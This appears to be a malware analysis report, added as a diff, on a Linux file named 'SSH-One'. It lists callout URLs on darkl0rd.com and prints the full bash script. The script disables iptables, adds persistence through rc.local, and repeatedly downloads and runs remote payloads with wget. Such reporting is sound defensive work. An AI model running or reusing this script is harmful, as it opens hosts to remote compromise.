@@ -1,0 +1,74 @@
+
+Suspicious File Name:
+---------------------
+
+SSH-One
+
+
+Suspicious File Path:
+----------------------
+
+/home/ubuntu/Downloads/SSH-One 
+
+
+
+Suspicious call out domains: 
+----------------------------
+
+http://darkl0rd.com:7758/SSH-T
+http://darkl0rd.com:7758/SSH-One
+
+
+
+Summary About Expected Behavior:
+--------------------------------
+
+On being executed, the code will:
+
+1.flush the iptables firewall table, stop the iptables service and prevent it from starting on startup
+2.make changes to the rc.local file that runs on startup to make sure the SSH-T and the SSH-One are running and are run on each startup
+3. it will also make sure these scripts are always present and running and if not it will try to download them from the sources (the suspicious call out domains) 
+
+
+Suspicious File Content:
+------------------------
+
+#!/bin/bash
+iptables -F
+/etc/init.d/iptables stop
+chkconfig iptables off
+echo "chmod +x /tmp/SSH-T" >> /etc/rc.local
+echo "/tmp/SSH-T" >>  /etc/rc.local
+echo "chmod +x /tmp/SSH-One" >> /etc/rc.local
+echo "/tmp/SSH-One" >>  /etc/rc.local
+m=SSH-T
+script=SSH-One
+hfs_m=http://darkl0rd.com:7758/SSH-T
+hfs_s=http://darkl0rd.com:7758/SSH-One
+rm -f /tmp/$m*
+while true
+
+do
+    ps aux | grep $m | grep -v grep
+    if [ $? -eq 0 ];then
+         sleep 10
+    else
+                ls -l /tmp/$m
+                        if [ $? -eq 0 ];then
+                         /tmp/$m
+                        else
+    cd /tmp/;wget $hfs_m ; chmod a+x $m;/tmp/$m
+        fi
+   fi
+    ps aux | grep $script | grep -v grep
+    if [ $? -eq 0 ];then
+         sleep 10
+    else
+        ls -l /tmp/$script
+        if [ $? -eq 0];then
+         /tmp/$script
+        else
+cd /tmp;wget $hfs_s ; chmod a+x $script;/tmp/$script
+        fi
+   fi
+done
